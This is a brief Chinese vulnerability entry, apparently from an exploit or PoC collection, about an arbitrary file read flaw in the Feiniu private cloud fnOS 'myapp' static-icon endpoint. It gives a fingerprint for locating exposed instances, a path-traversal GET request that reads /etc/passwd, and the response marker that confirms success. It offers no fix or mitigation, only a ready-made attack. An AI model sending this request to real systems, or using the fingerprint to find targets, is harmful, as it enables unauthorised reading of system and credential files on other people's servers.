# 飞牛私有云FnOSmyapp存在任意文件读取漏洞

飞牛私有云 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="飞牛-私有云fnOS"`
- **请求**：`GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1`
- **响应特征**：500 root: